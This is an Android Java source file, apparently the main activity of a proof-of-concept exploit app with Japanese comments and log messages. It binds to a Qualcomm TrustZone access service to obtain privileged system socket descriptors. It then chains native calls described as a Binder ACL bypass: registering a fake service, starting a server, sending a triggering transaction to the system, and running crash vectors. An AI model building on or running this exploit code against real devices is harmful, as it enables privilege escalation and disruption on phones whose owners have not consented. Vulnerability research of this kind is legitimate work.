package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.ParcelFileDescriptor;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

public class MainActivity extends AppCompatActivity {
    private TextView tvLog;
    private Button btnStart, btnStop, btnAdd, btnStartServer, btnSendTxn, btnCrash, btnAuto;
    private IMinkSocketFd minkService;
    private boolean isServiceBound = false;

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            minkService = IMinkSocketFd.Stub.asInterface(service);
            isServiceBound = true;
            appendLog("TZAccessService に接続しました");
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            minkService = null;
            isServiceBound = false;
            appendLog("TZAccessService から切断されました");
        }
    };

    // JNI からのコールバック（ログ出力）
    public void appendLog(String msg) {
        runOnUiThread(() -> {
            tvLog.append(msg + "\n");
            ScrollView sv = findViewById(R.id.scrollView);
            sv.fullScroll(View.FOCUS_DOWN);
        });
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);
        btnAdd = findViewById(R.id.btn_add_only);
        btnStartServer = findViewById(R.id.btn_start_server);
        btnSendTxn = findViewById(R.id.btn_send_txn);
        btnCrash = findViewById(R.id.btn_crash);
        btnAuto = findViewById(R.id.btn_auto_serve);

        // JNI にコールバックオブジェクトを設定
        nativeSetCallback(this);

        // TZAccessService にバインド
        Intent intent = new Intent("com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService");
        intent.setPackage("com.qualcomm.qti.qms.service.trustzoneaccess");
        bindService(intent, connection, Context.BIND_AUTO_CREATE);

        btnStart.setOnClickListener(v -> startExploit());
        btnStop.setOnClickListener(v -> stopExploit());
        btnAdd.setOnClickListener(v -> addService());
        btnStartServer.setOnClickListener(v -> startServer());
        btnSendTxn.setOnClickListener(v -> sendTransaction());
        btnCrash.setOnClickListener(v -> crashVectors());
        btnAuto.setOnClickListener(v -> autoServe());
    }

    private void startExploit() {
        appendLog("=== 総合攻撃開始 ===");
        // 1. TZ ソケット取得
        getSocketFd("/dev/socket/fwmarkd");
        getSocketFd("/dev/socket/dnsproxyd");
        // 2. ACL Bypass でサービス登録
        addService();
        // 3. サーバー起動
        startServer();
        // 4. システムへトランザクション送信（トリガー）
        sendTransaction();
    }

    private void stopExploit() {
        appendLog("停止しました");
    }

    private void addService() {
        appendLog("Binder ACL bypass で偽サービスを登録中...");
        int handle = nativeAddServiceOnly("test.service");
        if (handle >= 0) {
            appendLog("登録成功。handle=" + handle);
        } else {
            appendLog("登録失敗");
        }
    }

    private void startServer() {
        appendLog("サーバースレッドを起動中...");
        int pid = nativeStartServer(0);
        if (pid > 0) {
            appendLog("サーバー起動 (PID=" + pid + ")");
        } else {
            appendLog("サーバー起動失敗");
        }
    }

    private void sendTransaction() {
        appendLog("システムへトランザクション送信...");
        nativeSendTransactionToSystem();
    }

    private void crashVectors() {
        appendLog("クラッシュベクター実行");
        nativeCrashVectors();
    }

    private void autoServe() {
        appendLog("Auto Serve: 登録 + サーバー起動");
        nativeRegisterAndServe("test.service");
    }

    private void getSocketFd(String socketPath) {
        if (!isServiceBound || minkService == null) {
            appendLog("TZサービスがバインドされていません");
            return;
        }
        try {
            int[] handle = new int[1];
            ParcelFileDescriptor pfd = minkService.a(socketPath, handle);
            if (pfd != null) {
                int fd = pfd.getFd();  // 修正: getFileDescriptor() → getFd()
                appendLog("取得 fd: " + fd + " (handle=" + handle[0] + ") for " + socketPath);
                // 必要に応じて JNI に fd を渡す（例：nativeUseFd(fd)）
                // nativeUseFd(fd); // 未実装の場合はコメントアウト
            } else {
                appendLog("fd 取得失敗: " + socketPath);
            }
        } catch (Exception e) {
            appendLog("エラー: " + e.getMessage());
        }
    }

    // JNI ネイティブメソッド
    public static native void nativeSetCallback(Object callback);
    public static native int nativeAddServiceOnly(String serviceName);
    public static native int nativeStartServer(int handle);
    public static native void nativeRegisterAndServe(String serviceName);
    public static native void nativeSendTransactionToSystem();
    public static native void nativeCrashVectors();
    public static native String nativeGetKernelInfo();

    static {
        System.loadLibrary("pocjni");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (isServiceBound) unbindService(connection);
    }
}
